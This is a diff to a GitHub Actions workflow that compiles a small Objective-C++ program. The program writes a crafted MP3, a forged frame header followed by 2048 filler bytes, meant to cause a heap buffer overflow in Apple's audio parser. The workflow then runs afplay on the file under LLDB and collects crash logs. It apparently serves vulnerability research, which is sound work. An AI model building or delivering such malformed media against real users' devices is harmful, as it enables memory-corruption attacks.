@@ -19,46 +19,47 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: Patch encodeme.mm with a more aggressive corruption technique
-      - name: Patch encodeme.mm to create a severely invalid MP3
+      # Updated: Patch encodeme.mm to attempt a heap buffer overflow.
+      - name: Patch encodeme.mm to generate a heap-overflow MP3
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to generate a file with an invalid frame header..."
+          echo "Patching encodeme.mm to generate a file designed to cause a heap overflow..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
+          #include <string.h>
 
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  NSString *fileName = @"output_invalid.mp3";
+                  NSString *fileName = @"output_overflow.mp3";
                   FILE *file = fopen(fileName.UTF8String, "wb");
                   if (!file) {
                       fprintf(stderr, "Failed to create file: %s\n", fileName.UTF8String);
                       return 1;
                   }
 
-                  // New PoC: Write a completely invalid MP3 frame header.
-                  // This header claims to be a valid MP3 frame but contains garbage values
-                  // for bitrate and other fields, which is more likely to cause a parser crash
-                  // than a simple VBR header mismatch.
-                  char invalidFrameHeader[4] = {
-                      (char)0xFF, // Frame sync
-                      (char)0xFA, // Frame sync + MPEG v1, Layer III
-                      (char)0x10, // Invalid bitrate index, no padding, no private bit
-                      (char)0x00  // Other flags
+                  // PoC: Heap Buffer Overflow Attempt
+                  // This header lies, claiming the frame's data size is very small (1 byte).
+                  // A vulnerable parser might allocate a small buffer based on this lie.
+                  char malicious_header[4] = {
+                      (char)0xFF, (char)0xFB, // MP3 sync and version/layer info
+                      (char)0x50, // Bitrate 80kbps, Padding bit=0
+                      (char)0x00
                   };
                   
-                  // Write the invalid header multiple times to create a small file
-                  for (int i = 0; i < 100; ++i) {
-                      fwrite(invalidFrameHeader, 1, sizeof(invalidFrameHeader), file);
-                      // Followed by some garbage data
-                      char dummyData[400] = {0};
-                      fwrite(dummyData, 1, sizeof(dummyData), file);
-                  }
+                  // Frame size for 80kbps at 44.1kHz is 156 bytes. We will write much more.
+                  fwrite(malicious_header, 1, sizeof(malicious_header), file);
+
+                  // Now, write a large chunk of data immediately after the deceitful header.
+                  // If the player allocated a small buffer, writing this large block
+                  // will cause a heap buffer overflow.
+                  char overflow_data[2048];
+                  memset(overflow_data, 'A', sizeof(overflow_data));
+                  fwrite(overflow_data, 1, sizeof(overflow_data), file);
                   
-                  fprintf(stderr, "PoC: Wrote a file with invalid MP3 frame headers.\n");
+                  fprintf(stderr, "PoC: Wrote a file designed to trigger a heap overflow.\n");
                   fclose(file);
 
                   time_t endTime = time(NULL);
@@ -82,20 +83,20 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_debug
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This step is no longer needed as the new PoC is simpler, but it's harmless to keep
+      # Run and Verify File Generation
       - name: Run and Verify File Generation
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           ./encodeme_debug
-          echo "File 'output_invalid.mp3' generated."
-          ls -l output_invalid.mp3
+          echo "File 'output_overflow.mp3' generated."
+          ls -l output_overflow.mp3
           
       # Launch the player directly under LLDB to catch any startup crashes
       - name: Launch Player Under LLDB to Catch Startup Crashes
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) with new invalid file ---" > $PLAYER_LOG_FILE
+          echo "--- Debugging Audio Player (afplay) with heap overflow file ---" > $PLAYER_LOG_FILE
           echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
           echo "Creating LLDB script to launch and monitor afplay..."
@@ -110,7 +111,7 @@ jobs:
           echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
           # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
           # We add '|| true' because afplay might exit with an error, which we expect.
-          lldb -s player_debug_script.lldb -- afplay output_invalid.mp3 >> $PLAYER_LOG_FILE 2>&1 || true
+          lldb -s player_debug_script.lldb -- afplay output_overflow.mp3 >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
@@ -121,7 +122,7 @@ jobs:
         with:
           name: audio-and-debug-artifacts
           path: |
-            AppleTest/apple-positional-audio-codec-invalid-header-main/output_invalid.mp3
+            AppleTest/apple-positional-audio-codec-invalid-header-main/output_overflow.mp3
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
